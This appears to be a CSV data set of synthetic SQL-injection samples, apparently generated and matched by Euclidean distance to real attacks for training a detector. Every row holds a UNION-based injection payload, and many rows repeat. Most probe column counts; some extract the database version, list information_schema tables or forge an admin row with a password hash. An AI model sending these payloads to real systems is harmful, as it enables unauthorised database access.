id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_001467,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000052,7.550272583823503
CTGAN_001468,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000073,8.98238631056688
CTGAN_001469,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000060,6.757381389811351
CTGAN_001470,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,5.803886132481151
CTGAN_001471,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000065,8.229826214560893
CTGAN_001472,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,8.27795559676516
CTGAN_001473,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,12.408291150693007
CTGAN_001474,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,7.8308778483954455
CTGAN_001475,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,6.288363733367643
CTGAN_001476,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000036,6.662844037087432
CTGAN_001477,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,8.207327892728422
CTGAN_001478,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000033,6.146867705459626
CTGAN_001479,attack,union,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",nearest_attack_euclidean,R000042,7.7132611935715065
CTGAN_001480,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,7.788014899929064
CTGAN_001481,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,5.281013603154098
CTGAN_001482,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,6.364479516848091
CTGAN_001483,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,8.523683513040185
CTGAN_001484,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,7.9102090831771
CTGAN_001485,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000073,11.123263686814884
CTGAN_001486,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,5.521703284772075
CTGAN_001487,attack,union,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",nearest_attack_euclidean,R000055,9.171313153088091
CTGAN_001488,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,7.32902340720148
CTGAN_001489,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,8.118723975507162
CTGAN_001490,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,8.109254844578365
CTGAN_001491,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,5.394654018870138
CTGAN_001492,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,7.505798859713435
CTGAN_001493,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000015,12.959131892814852
CTGAN_001494,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000022,6.007999032318786
CTGAN_001495,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000045,6.38874409371117
CTGAN_001496,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,7.615936675133793
CTGAN_001497,attack,union,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",nearest_attack_euclidean,R000042,5.454359947781122
CTGAN_001498,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,6.158750985522153
CTGAN_001499,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,6.573518241207637
CTGAN_001500,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,9.435196862949264
CTGAN_001501,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000073,5.991278521819169
CTGAN_001502,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,4.6519210548672785
CTGAN_001503,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000052,5.837336982427876
CTGAN_001504,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,5.193156702294812
CTGAN_001505,attack,union,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",nearest_attack_euclidean,R000040,5.5628783665246155
CTGAN_001506,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R000059,8.82206196145918
CTGAN_001507,attack,union,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",nearest_attack_euclidean,R000055,6.100868766227594
CTGAN_001508,attack,union,"-2314%'   )    )    union all select 4612,4612--",nearest_attack_euclidean,R000023,6.401480853341862
CTGAN_001509,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000021,12.410879446165659
CTGAN_001510,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000036,5.866943352753908
CTGAN_001511,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000065,4.848973713164787
CTGAN_001512,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000047,6.459638042749301
CTGAN_001513,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000052,6.627023572816275
CTGAN_001514,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,5.555929651311931
CTGAN_001515,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,7.300033797844557
CTGAN_001516,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,7.571869689200706
CTGAN_001517,attack,union,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",nearest_attack_euclidean,R000042,5.676781653526169
CTGAN_001518,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,5.8323044007611475
CTGAN_001519,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,5.989014856299212
CTGAN_001520,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,5.880469548131522
CTGAN_001521,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,9.78849269591425
CTGAN_001522,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000046,6.797058589097114
CTGAN_001523,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000029,6.771681038315701
CTGAN_001524,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000078,6.618836186165632
CTGAN_001525,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,4.749698428635201
CTGAN_001526,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,8.63893001732218
CTGAN_001527,attack,union,"-4869%' union all select 5729,5729,5729--",nearest_attack_euclidean,R000075,7.018686487235406
CTGAN_001528,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000065,7.027351207529138
CTGAN_001529,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,7.536409806679028
CTGAN_001530,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000028,7.86343493062608
CTGAN_001531,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000041,4.281967390636387
CTGAN_001532,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000051,6.937611302327833
CTGAN_001533,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000021,12.447543058253116
CTGAN_001534,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000028,5.297215135721267
CTGAN_001535,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,7.272387726845455
CTGAN_001536,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,7.644579738477248
CTGAN_001537,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000022,6.693726889764097
CTGAN_001538,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000025,5.166576315332312
CTGAN_001539,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,5.654127531057299
CTGAN_001540,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000053,4.467764751734874
CTGAN_001541,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000057,6.4109864669997965
CTGAN_001542,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000050,7.014034380645221
CTGAN_001543,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,6.182865723904891
CTGAN_001544,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000004,8.596356196286111
CTGAN_001545,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000056,6.411052264069928
CTGAN_001546,attack,union,"-4869%' union all select 5729,5729,5729--",nearest_attack_euclidean,R000075,7.402798463116899
CTGAN_001547,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,6.1943535063115585
CTGAN_001548,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,5.695180253855432
CTGAN_001549,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000065,6.73035551856424
CTGAN_001550,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000036,5.192187897222389
CTGAN_001551,attack,union,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",nearest_attack_euclidean,R000067,4.5406147078110815
CTGAN_001552,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,8.728270570458209
CTGAN_001553,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000036,4.987923726157133
CTGAN_001554,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R000072,6.93034863529658
CTGAN_001555,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000031,7.191734116079306
CTGAN_001556,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,6.5026133008516105
CTGAN_001557,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,10.46082910529531
CTGAN_001558,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,6.1855668782120174
CTGAN_001559,attack,union,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",nearest_attack_euclidean,R000042,7.214243862627489
CTGAN_001560,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000046,5.857110531818478
CTGAN_001561,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,5.7525264059294745
CTGAN_001562,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000056,5.622684906697497
CTGAN_001563,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000066,8.15752561056035
CTGAN_001564,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,7.661910772107021
CTGAN_001565,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,5.558432849462137
CTGAN_001566,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,7.116058126650795
CTGAN_001567,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,5.611108906258478
CTGAN_001568,attack,union,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",nearest_attack_euclidean,R000067,7.535994101214248
CTGAN_001569,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,6.197874137967258
CTGAN_001570,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000022,7.553420728048377
CTGAN_001571,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,6.923135844808261
CTGAN_001572,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,9.997437431078625
CTGAN_001573,attack,union,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",nearest_attack_euclidean,R000040,7.349835379362211
CTGAN_001574,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R000032,7.56160902944491
CTGAN_001575,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,6.926371681554461
CTGAN_001576,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,4.659398178859477
CTGAN_001577,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,6.1687941440049485
CTGAN_001578,attack,union," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000011,8.01115442702205
CTGAN_001579,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000065,5.971847336274024
CTGAN_001580,attack,union,"-4869%' union all select 5729,5729,5729--",nearest_attack_euclidean,R000075,5.429068543139743
CTGAN_001581,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000071,3.9514392699614724
CTGAN_001582,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,9.683278879859435
CTGAN_001583,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,5.277081753609252
CTGAN_001584,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000074,7.230537546071082
CTGAN_001585,attack,union,"-2314%'   )    )    union all select 4612,4612--",nearest_attack_euclidean,R000023,6.1683342567235355
CTGAN_001586,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000053,8.240260859976978
CTGAN_001587,attack,union,"-2314%'   )    )    union all select 4612,4612--",nearest_attack_euclidean,R000023,5.545016475742025
CTGAN_001588,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000033,6.081405986284991
CTGAN_001589,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,5.722493821991528
CTGAN_001590,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,5.679267191664155
CTGAN_001591,attack,union,"-4869%' union all select 5729,5729,5729--",nearest_attack_euclidean,R000075,6.87161619634733
CTGAN_001592,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000065,5.8139161549962015
CTGAN_001593,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,11.388600953208787
CTGAN_001594,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000036,5.191212460164751
CTGAN_001595,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000045,6.018658871016355
CTGAN_001596,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,8.026400303062331
CTGAN_001597,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,6.242070780087852
CTGAN_001598,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,6.262126528682092
CTGAN_001599,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000041,7.328303031275296
CTGAN_001600,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000052,6.932919153125859
CTGAN_001601,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R000072,6.257699845300129
CTGAN_001602,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,7.664700510260683
CTGAN_001603,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000057,9.771179354385175
CTGAN_001604,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,11.352301821642545
CTGAN_001605,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000060,4.498110481318039
CTGAN_001606,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,5.868144652778861
CTGAN_001607,attack,union,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",nearest_attack_euclidean,R000067,5.656015737768621
CTGAN_001608,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,6.864779239890583
CTGAN_001609,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,8.316082157485488
CTGAN_001610,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,5.311445807825137
CTGAN_001611,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,8.613790514968642
CTGAN_001612,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,7.903562313576502
CTGAN_001613,attack,union,"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",nearest_attack_euclidean,R000067,8.931846574050585
CTGAN_001614,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,4.724328828263852
CTGAN_001615,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R000059,5.081803599285474
CTGAN_001616,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R000059,7.835181167080943
CTGAN_001617,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,6.84886212102346
CTGAN_001618,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000053,7.128033736782696
CTGAN_001619,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000058,10.75269990253716
CTGAN_001620,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,7.930153881363493
CTGAN_001621,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000031,7.901758165236938
CTGAN_001622,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,7.417832814011881
CTGAN_001623,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000076,7.935571089414602
CTGAN_001624,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,5.5996083666278365
CTGAN_001625,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,8.07032065149806
CTGAN_001626,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000036,7.146889918251394
CTGAN_001627,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000070,5.406382207856249
CTGAN_001628,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000073,7.0246266215846855
CTGAN_001629,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000060,9.826359653549117
CTGAN_001630,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,6.63686972881309
CTGAN_001631,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,7.835592118415053
CTGAN_001632,attack,union,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",nearest_attack_euclidean,R000040,4.745720030299723
CTGAN_001633,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000039,7.059000463634402
CTGAN_001634,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R000072,7.853349020043146
CTGAN_001635,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000015,11.54798614740121
CTGAN_001636,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,5.252634583670031
CTGAN_001637,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000052,7.116271983986682
CTGAN_001638,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000052,6.497683939914923
CTGAN_001639,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000052,9.37346601194983
CTGAN_001640,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,8.164157504038194
CTGAN_001641,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R000032,5.929581764982924
CTGAN_001642,attack,union,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",nearest_attack_euclidean,R000040,8.040913838707485
CTGAN_001643,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000027,8.4603446151469
CTGAN_001644,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,5.553050348976095
CTGAN_001645,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000041,5.7533816634639505
CTGAN_001646,attack,union,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",nearest_attack_euclidean,R000055,7.984914026418133
CTGAN_001647,attack,union,"-4869%' union all select 5729,5729,5729--",nearest_attack_euclidean,R000075,6.883240007371704
CTGAN_001648,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000077,6.654799967295189
CTGAN_001649,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000054,6.232161228912704
CTGAN_001650,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000069,6.227617981286941
CTGAN_001651,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000065,5.290677261453294
